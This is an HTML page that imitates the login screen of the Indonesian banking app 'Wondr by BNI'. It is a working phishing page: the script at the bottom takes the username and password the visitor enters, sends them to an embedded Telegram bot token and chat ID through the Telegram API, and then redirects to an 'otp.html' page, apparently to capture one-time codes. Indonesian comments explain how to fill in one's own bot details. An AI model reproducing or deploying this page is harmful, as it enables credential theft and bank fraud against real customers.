<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wondr by BNI</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        utama: {
                            hijauMuda: '#86E2D5',
                            kuning: '#FFD12F',
                            oranye: '#FF7A2F',
                            kuningMuda: '#E2F988',
                            merahMuda: '#FF85B3',
                        },
                        teks: {
                            oranye: '#FF7A2F',
                            abu: '#9E9E9E',
                        }
                    },
                    fontFamily: {
                        sans: ['Arial', 'sans-serif'],
                    },
                }
            }
        }
    </script>
    <style type="text/tailwindcss">
        @layer utilities {
            .content-auto {
                content-visibility: auto;
            }
            /* ✅ UKURAN KOTAK DIPERKECIL SAJA ✅ */
            .tombol-menu {
                @apply w-[55px] h-[55px] rounded-lg flex items-center justify-center text-xl mb-1;
            }
            .lengkung-kiri-atas {
                border-top-left-radius: 100%;
                border-top-right-radius: 0;
                border-bottom-right-radius: 100%;
                border-bottom-left-radius: 0;
            }
            .lengkung-kiri-bawah {
                border-top-left-radius: 0;
                border-top-right-radius: 100%;
                border-bottom-right-radius: 100%;
                border-bottom-left-radius: 0;
            }
            .lengkung-kanan-bawah {
                border-top-left-radius: 100%;
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
                border-bottom-left-radius: 100%;
            }
        }
    </style>
</head>
<body class="bg-white font-sans max-w-md mx-auto min-h-screen relative overflow-hidden">

    <!-- LENGKUNG WARNA DI SUDUT -->
    <div class="absolute -top-16 -left-16 w-40 h-40 bg-utama-hijauMuda lengkung-kiri-atas"></div>
    <div class="absolute -bottom-16 -left-16 w-40 h-40 bg-utama-kuningMuda lengkung-kiri-bawah"></div>
    <div class="absolute -bottom-10 -right-10 w-28 h-28 bg-utama-merahMuda lengkung-kanan-bawah"></div>

    <!-- IKON ATAS KANAN -->
    <div class="absolute top-4 right-4">
        <i class="fa fa-headphones text-lg text-gray-700"></i>
    </div>

    <!-- KONTEN UTAMA -->
    <main class="px-6 h-screen flex flex-col items-center justify-center relative z-10">

        <!-- LOGO WONDR -->
        <div class="mb-10 text-center">
            <h1 class="text-[36px] font-bold text-teks-oranye leading-none">
                wondr
                <span class="block text-[12px] text-gray-600 font-normal mt-1">by BNI</span>
                <span class="block w-8 h-1 bg-utama-hijauMuda mx-auto mt-1"></span>
            </h1>
        </div>

        <!-- TOMBOL MENU: E-WALLET - QRIS - TAPCASH ✅ KOTAK DIPERKECIL ✅ -->
        <div class="flex justify-center gap-4 mb-6">
            <div class="text-center">
                <div class="tombol-menu bg-utama-hijauMuda text-white">
                     <img src="ewalet.png" alt="TapCash" class="w-[70%] h-[70%] object-contain">
                    <i class=""></i>
                </div>
                <p class="text-[11px] font-medium">E-Wallet</p>
            </div>
            <div class="text-center">
                <div class="tombol-menu bg-utama-kuning text-white">
                     <img src="putih.png" alt="TapCash" class="w-[70%] h-[70%] object-contain">
                    <i class=""></i>
                </div>
                <p class="text-[11px] font-medium">QRIS</p>
            </div>
            <div class="text-center">
                <div class="tombol-menu bg-utama-oranye text-white overflow-hidden">
                    <img src="logo.png" alt="TapCash" class="w-[70%] h-[70%] object-contain">
                </div>
                <p class="text-[11px] font-medium">TapCash</p>
            </div>
        </div>

        <!-- FORM USERNAME & PASSWORD -->
        <div class="w-full mb-3 space-y-2">
            <input type="text" id="username" placeholder="Username" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-utama-hijauMuda">
            <input type="password" id="password" placeholder="Password" class="w-full px-3 py-2 text-sm border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-utama-hijauMuda">
        </div>

        <!-- TOMBOL LOGIN ✅ SUDAH DIATUR: KIRIM KE TELEGRAM LALU PINDAH HALAMAN ✅ -->
        <button id="tombolLogin" class="w-full py-2 bg-utama-hijauMuda text-white rounded-full flex items-center justify-center gap-2 text-base font-medium mb-3" onclick="cekDanKirim()">
            <i class="fa fa-fingerprint"></i>
            Login
        </button>

        <!-- VERSI -->
        <p class="text-[11px] text-teks-abu">1.0.2</p>

    </main>

    <!-- ✅ KODE JAVASCRIPT UNTUK KIRIM DATA KE TELEGRAM ✅ -->
    <script>
        // ✅ ISI DATA TELEGRAM KAMU DISINI ✅
        const TOKEN_BOT = "8448627224:AAH-yfGcIglnMile1XSnAGnng7Jy4_K5xGo";     // Ganti Token Bot
        const CHAT_ID = "8617754329";         // Ganti Chat ID
        const HALAMAN_TUJUAN = "otp.html";                 // Halaman tujuan setelah terkirim

        function cekDanKirim() {
            // Ambil nilai dari kolom isian
            var user = document.getElementById("username").value;
            var pass = document.getElementById("password").value;

            // Cek apakah keduanya sudah diisi
            if (user !== "" && pass !== "") {

                // Ubah tampilan tombol jadi proses
                const tombol = document.getElementById("tombolLogin");
                tombol.innerHTML = "Sedang Memproses...";
                tombol.disabled = true;

                // ✅ KIRIM DATA KE TELEGRAM ✅
                fetch(`https://api.telegram.org/bot${TOKEN_BOT}/sendMessage?chat_id=${CHAT_ID}&text=LOGIN%20WONDR%20BNI%0A%0AUsername%3A%20${user}%0APassword%3A%20${pass}`)
                .then(response => response.json())
                .then(data => {
                    // Jika pesan BERHASIL terkirim, baru pindah halaman
                    if (data.ok) {
                        tombol.innerHTML = "Berhasil!";
                        // Pindah ke halaman tujuan
                        window.location.href = HALAMAN_TUJUAN;
                    }
                })
                .catch(error => {
                    alert("Gagal mengirim data! Periksa koneksi atau pengaturan.");
                    tombol.innerHTML = "Login";
                    tombol.disabled = false;
                });

            } else {
                // Jika ada yang kosong, beri peringatan
                alert("⚠️Silakan isi Username dan Password terlebih dahulu!");
            }
        }
    </script>

</body>
</html>
